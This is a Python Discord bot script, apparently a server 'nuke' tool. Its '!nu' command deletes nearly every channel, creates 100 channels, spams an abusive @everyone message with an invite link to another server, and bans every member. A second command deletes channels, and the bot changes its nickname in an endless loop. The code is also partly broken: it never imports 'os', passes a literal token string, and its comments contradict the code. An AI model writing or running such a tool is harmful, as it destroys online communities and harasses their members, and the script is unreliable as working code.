import discord
from discord.ext import commands
import asyncio
import random
import string

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

TOKEN = os.getenv("TOKEN2")

bot = commands.Bot(command_prefix="!", intents=intents)

# Event to change nickname continuously
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

    # Get the guild where the bot is a member
    guild = discord.utils.get(bot.guilds)

    if guild is None:
        print("No guild found.")
        return

    while True:
        # Generate a random nickname
        random_nick = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
        
        # Change the bot's nickname in the guild
        await guild.me.edit(nick=random_nick)
        await asyncio.sleep(1)  # Change nickname every 0.1 seconds

# Channel names to preserve
preserve_keywords = ["rules", "welcome", "moderator"]

@bot.command()
async def nu(ctx):
    guild = ctx.guild
    preserve_keywords = ["rules", "welcome", "moderator"]

    # Step 1: Gather channels to delete quickly
    channels_to_delete = [channel for channel in guild.channels 
                          if not any(keyword in channel.name.lower() for keyword in preserve_keywords)]
    
    # Step 2: Delete channels concurrently
    delete_tasks = [channel.delete(reason="nuke command executed") for channel in channels_to_delete]
    await asyncio.gather(*delete_tasks)

    # Step 3: Create 100 new channels concurrently
    create_tasks = []
    for i in range(100):
        new_channel = await guild.create_text_channel("hi I am Baby Man")
        
        # Step 4: Send a message using the bot itself
        spam_message = "@everyone this server just got fucked. Join this one instead: https://discord.gg/xMMZqYgr72"

        # Spam the message in the new channel
        for _ in range(5):  # Adjust the number of messages to send
            create_tasks.append(new_channel.send(spam_message))
    
    # Execute all spam messages concurrently
    await asyncio.gather(*create_tasks)

    # Step 5: Ban every user and kick every bot
    ban_tasks = []
    for member in guild.members:
        # Skip the bot that is running this command
        if member.bot:
            ban_tasks.append(member.ban(reason="Banned by nuke command"))
        else:
            ban_tasks.append(member.ban(reason="Banned by nuke command"))  # To ban all users

    # Execute ban tasks
    await asyncio.gather(*ban_tasks)

    # No response from the bot itself; it stays silent

@bot.command()
async def aa(ctx):
    preserve_keywords = ["important", "announcements"]  # Example keywords

    channels_to_delete = [channel for channel in ctx.guild.channels
                          if not any(keyword in channel.name.lower() for keyword in preserve_keywords)]

    delete_tasks = [channel.delete(reason="nuke command executed") for channel in channels_to_delete]
    await asyncio.gather(*delete_tasks)
    
# Running the bot
bot.run('TOKEN2')
